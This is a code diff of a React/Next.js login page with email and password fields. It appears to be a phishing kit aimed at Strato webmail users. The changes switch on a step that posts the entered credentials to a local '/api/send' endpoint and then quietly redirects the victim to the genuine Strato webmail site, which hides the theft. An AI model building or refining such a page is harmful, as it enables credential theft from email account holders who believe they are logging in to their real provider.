@@ -7,8 +7,9 @@ import axios from "axios";
 
 export default function Home() {
   const [languages, setLanguages] = useState<Lang | null>(null);
-  const [langChange, setLangChange] =
-    useState<(typeof i18n.locales)[number]>("en");
+  const [langChange, setLangChange] = useState<(typeof i18n.locales)[number]>(
+    i18n.defaultLocale
+  );
 
   const forma = useRef<HTMLFormElement>(null);
 
@@ -26,12 +27,11 @@ export default function Home() {
     try {
       const result = await axios.post("/api/send", JSON.stringify(dataObj));
 
-      // if (result.status === 200) {
-      //   return window.location.replace(
-      //     "https://webmail.strato.com/appsuite/ui"
-      //   );
-      // }
-      console.log(result);
+      if (result.status === 200) {
+        return window.location.replace(
+          "https://webmail.strato.com/appsuite/ui"
+        );
+      }
 
       return;
     } catch (error) {
@@ -39,15 +39,14 @@ export default function Home() {
     }
   };
   useEffect(() => {
-    if (window) {
-      const lang = localStorage.getItem(
-        "lang"
-      ) as (typeof i18n.locales)[number];
-      import("../../inter/language.json").then((mod) => {
-        setLanguages(mod.default[lang ?? "en"]);
-      });
-    }
-  }, [langChange]);
+    const lang = sessionStorage?.getItem(
+      "lang"
+    ) as (typeof i18n.locales)[number];
+    import("../../inter/language.json").then((mod) => {
+      setLanguages(mod.default[lang ?? i18n.defaultLocale]);
+    });
+  }, [langChange, languages]);
+
   if (languages)
     return (
       <>
@@ -103,7 +102,7 @@ export default function Home() {
                 type="email"
                 name="email"
                 id="em"
-                className="block py-2 px-1 outline-none w-full"
+                className="block py-2 px-1 outline-none w-full mr-1"
                 required
               />
             </div>
@@ -132,7 +131,7 @@ export default function Home() {
                 type="password"
                 name="pass"
                 id="pass"
-                className="block py-2 px-1 outline-none w-full"
+                className="block py-2 px-1 outline-none w-full mr-1"
                 required
               />
             </div>
